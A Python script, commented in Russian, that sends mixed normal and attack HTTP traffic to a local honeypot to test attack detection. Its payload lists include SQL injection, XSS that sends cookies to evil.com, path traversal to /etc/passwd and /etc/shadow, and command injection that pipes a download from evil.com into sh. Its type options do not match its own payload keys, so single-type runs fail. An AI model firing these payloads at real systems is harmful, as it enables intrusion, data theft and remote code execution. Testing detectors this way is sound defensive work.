#!/usr/bin/env python3
"""
Генератор тестового трафика для honeypot
"""

import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class TrafficGenerator:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.attack_patterns = self.load_attack_patterns()
        self.normal_patterns = self.load_normal_patterns()
    
    def load_attack_patterns(self):
        """Загрузка паттернов атак"""
        return {
            'sql_injection': [
                f"{self.base_url}/rest/products/search?q=' OR '1'='1",
                f"{self.base_url}/rest/products/search?q=' UNION SELECT username, password FROM users--",
                f"{self.base_url}/rest/products/search?q='; DROP TABLE users--",
                f"{self.base_url}/rest/products/search?q='; SELECT SLEEP(10)--",
                f"{self.base_url}/rest/products/search?q=' OR 'a'='a",
                f"{self.base_url}/rest/products/search?q=admin'--",
                f"{self.base_url}/rest/products/search?q=' OR 1=1--",
                f"{self.base_url}/rest/products/search?q=' AND 1=0 UNION SELECT NULL--",
                f"{self.base_url}/rest/products/search?q='; EXEC xp_cmdshell('dir')--",
                f"{self.base_url}/rest/products/search?q=' OR EXISTS(SELECT * FROM users)--"
            ],
            'xss': [
                f"{self.base_url}/#/search?q=<script>alert('XSS')</script>",
                f"{self.base_url}/#/search?q=<img src='x' onerror=alert('XSS')>",
                f"{self.base_url}/#/search?q=<svg onload=alert('XSS')>",
                f"{self.base_url}/#/search?q=javascript:alert(document.cookie)",
                f"{self.base_url}/#/search?q=<body onload=alert('XSS')>",
                f"{self.base_url}/#/search?q=<iframe src=javascript:alert('XSS')>",
                f"{self.base_url}/#/search?q=<script>document.location='http://evil.com?c='+document.cookie</script>",
                f"{self.base_url}/#/search?q=<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
                f"{self.base_url}/#/search?q=<div onmouseover=alert('XSS')>hover</div>",
                f"{self.base_url}/#/search?q=<a href=javascript:alert('XSS')>click</a>"
            ],
            'path_traversal': [
                f"{self.base_url}/assets/../../../etc/passwd",
                f"{self.base_url}/assets/..%2f..%2f..%2fetc%2fpasswd",
                f"{self.base_url}/assets/....//....//etc/passwd",
                f"{self.base_url}/assets/..\\\\..\\\\..\\\\windows\\\\system.ini",
                f"{self.base_url}/assets/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                f"{self.base_url}/assets/..%252f..%252f..%252fetc%252fpasswd",
                f"{self.base_url}/../../../../../../etc/shadow",
                f"{self.base_url}/assets/..\\..\\..\\boot.ini",
                f"{self.base_url}/assets/../".ljust(100, '.'),
                f"{self.base_url}/assets//etc//passwd"
            ],
            'command_injection': [
                f"{self.base_url}/rest/products/search?q='; ls -la /",
                f"{self.base_url}/rest/products/search?q=' | cat /etc/passwd",
                f"{self.base_url}/rest/products/search?q=' `id` '",
                f"{self.base_url}/rest/products/search?q=' && whoami",
                f"{self.base_url}/rest/products/search?q='; ping -c 5 127.0.0.1",
                f"{self.base_url}/rest/products/search?q=' || nc -lvp 4444",
                f"{self.base_url}/rest/products/search?q='; wget http://evil.com/shell.sh",
                f"{self.base_url}/rest/products/search?q='; curl http://evil.com | sh",
                f"{self.base_url}/rest/products/search?q='; python -c 'import os; os.system(\"id\")'",
                f"{self.base_url}/rest/products/search?q=' $(reboot)"
            ]
        }
    
    def load_normal_patterns(self):
        """Загрузка нормальных запросов"""
        return [
            f"{self.base_url}/",
            f"{self.base_url}/#/search?q=apple",
            f"{self.base_url}/#/search?q=orange",
            f"{self.base_url}/#/search?q=banana",
            f"{self.base_url}/#/login",
            f"{self.base_url}/#/register",
            f"{self.base_url}/#/about",
            f"{self.base_url}/rest/products",
            f"{self.base_url}/assets/public/images/products/Apple_juice.jpg",
            f"{self.base_url}/api/Challenges/?name=Score%20Board",
            f"{self.base_url}/rest/user/login",
            f"{self.base_url}/#/contact",
            f"{self.base_url}/#/basket",
            f"{self.base_url}/rest/basket/1",
            f"{self.base_url}/api/Products"
        ]
    
    def send_request(self, url, request_type="GET"):
        """Отправка HTTP запроса"""
        try:
            start_time = time.time()
            
            if request_type.upper() == "GET":
                response = self.session.get(url, timeout=5)
            elif request_type.upper() == "POST":
                response = self.session.post(url, timeout=5)
            else:
                response = self.session.get(url, timeout=5)
            
            response_time = int((time.time() - start_time) * 1000)
            
            return {
                'url': url,
                'status': response.status_code,
                'time': response_time,
                'success': response.status_code < 500,
                'size': len(response.content)
            }
            
        except Exception as e:
            return {
                'url': url,
                'status': 0,
                'time': 0,
                'success': False,
                'error': str(e),
                'size': 0
            }
    
    def generate_normal_traffic(self, count=10, delay=0.5):
        """Генерация нормального трафика"""
        print(f"🌐 Отправка {count} нормальных запросов...")
        
        results = []
        for i in range(count):
            url = random.choice(self.normal_patterns)
            result = self.send_request(url)
            results.append(result)
            
            if result['success']:
                print(f"   [{i+1}/{count}] ✅ {result['status']} | {result['time']}ms | {url[:50]}...")
            else:
                print(f"   [{i+1}/{count}] ❌ Ошибка: {result.get('error', 'Unknown')}")
            
            time.sleep(delay * random.uniform(0.5, 1.5))
        
        return results
    
    def generate_attack_traffic(self, attack_type='all', count=5, delay=1.0):
        """Генерация атакующего трафика"""
        print(f"🔥 Отправка {count} атак типа {attack_type}...")
        
        results = []
        
        # Выбор паттернов атак
        if attack_type == 'all':
            patterns = []
            for atk_type, urls in self.attack_patterns.items():
                patterns.extend(urls[:max(1, count // 4)])
        elif attack_type in self.attack_patterns:
            patterns = self.attack_patterns[attack_type][:count]
        else:
            print(f"⚠️  Неизвестный тип атаки: {attack_type}")
            return []
        
        random.shuffle(patterns)
        
        for i, url in enumerate(patterns[:count]):
            result = self.send_request(url)
            results.append(result)
            
            # Определяем тип атаки из URL
            detected_type = 'Unknown'
            if 'union' in url.lower() or 'select' in url.lower() or "'" in url:
                detected_type = 'SQL Injection'
            elif '<script>' in url.lower() or 'javascript:' in url.lower():
                detected_type = 'XSS'
            elif '../' in url or 'etc/passwd' in url:
                detected_type = 'Path Traversal'
            elif ';' in url or '|' in url or '`' in url:
                detected_type = 'Command Injection'
            
            if result['success']:
                print(f"   [{i+1}/{count}] 🚨 {detected_type} | {result['status']} | {result['time']}ms")
                print(f"      🔗 {url[:70]}..." if len(url) > 70 else f"      🔗 {url}")
            else:
                print(f"   [{i+1}/{count}] ❌ {detected_type} - Ошибка: {result.get('error', 'Unknown')}")
            
            time.sleep(delay * random.uniform(0.5, 1.5))
        
        return results
    
    def mixed_traffic(self, normal_count=5, attack_count=10, delay=0.3):
        """Смешанный трафик (нормальный + атаки)"""
        print("🔄 Генерация смешанного трафика...")
        
        all_results = []
        
        # Чередуем нормальные запросы и атаки
        total = normal_count + attack_count
        normal_sent = 0
        attack_sent = 0
        
        while normal_sent < normal_count or attack_sent < attack_count:
            # Решаем, что отправлять
            if normal_sent < normal_count and (random.random() > 0.5 or attack_sent >= attack_count):
                # Отправляем нормальный запрос
                url = random.choice(self.normal_patterns)
                result = self.send_request(url)
                all_results.append(result)
                normal_sent += 1
                
                print(f"   [{normal_sent+attack_sent}/{total}] 🌐 Нормальный | {result['status']} | {result['time']}ms")
                
            elif attack_sent < attack_count:
                # Отправляем атаку
                attack_types = list(self.attack_patterns.keys())
                atk_type = random.choice(attack_types)
                url = random.choice(self.attack_patterns[atk_type])
                result = self.send_request(url)
                all_results.append(result)
                attack_sent += 1
                
                print(f"   [{normal_sent+attack_sent}/{total}] 🚨 {atk_type} | {result['status']} | {result['time']}ms")
            
            time.sleep(delay * random.uniform(0.5, 1.5))
        
        print(f"\n📊 Итого: {normal_count} нормальных, {attack_count} атак")
        return all_results

def main():
    """Точка входа"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Генератор трафика для honeypot')
    parser.add_argument('--normal', '-n', type=int, default=5,
                       help='Количество нормальных запросов (по умолчанию: 5)')
    parser.add_argument('--attacks', '-a', type=int, default=10,
                       help='Количество атак (по умолчанию: 10)')
    parser.add_argument('--type', '-t', default='all',
                       choices=['all', 'sql', 'xss', 'traversal', 'command', 'mixed'],
                       help='Тип атак (по умолчанию: all)')
    parser.add_argument('--delay', '-d', type=float, default=0.5,
                       help='Задержка между запросами в секундах (по умолчанию: 0.5)')
    parser.add_argument('--url', '-u', default='http://localhost:3000',
                       help='URL honeypot (по умолчанию: http://localhost:3000)')
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("🚀 ГЕНЕРАТОР ТЕСТОВОГО ТРАФИКА ДЛЯ HONEYPOT")
    print("=" * 70)
    print(f"🎯 Honeypot: {args.url}")
    print(f"📊 Нормальных запросов: {args.normal}")
    print(f"🔥 Атак: {args.attacks}")
    print(f"⚡ Тип атак: {args.type}")
    print(f"⏱️  Задержка: {args.delay} сек")
    print("=" * 70)
    
    generator = TrafficGenerator(base_url=args.url)
    
    # Проверяем доступность honeypot
    print("🔍 Проверка доступности honeypot...")
    try:
        test_response = requests.get(args.url, timeout=5)
        if test_response.status_code == 200:
            print("✅ Honeypot доступен")
        else:
            print(f"⚠️  Honeypot отвечает со статусом {test_response.status_code}")
    except:
        print("❌ Honeypot недоступен! Убедитесь что он запущен.")
        return
    
    # Генерация трафика
    if args.type == 'mixed':
        generator.mixed_traffic(
            normal_count=args.normal,
            attack_count=args.attacks,
            delay=args.delay
        )
    else:
        if args.normal > 0:
            generator.generate_normal_traffic(count=args.normal, delay=args.delay)
        
        if args.attacks > 0:
            generator.generate_attack_traffic(
                attack_type=args.type,
                count=args.attacks,
                delay=args.delay
            )
    
    print("\n" + "=" * 70)
    print("✅ ГЕНЕРАЦИЯ ТРАФИКА ЗАВЕРШЕНА")
    print("=" * 70)
    print("📈 Проверьте вывод монитора для обнаружения атак!")

if __name__ == "__main__":
    main()
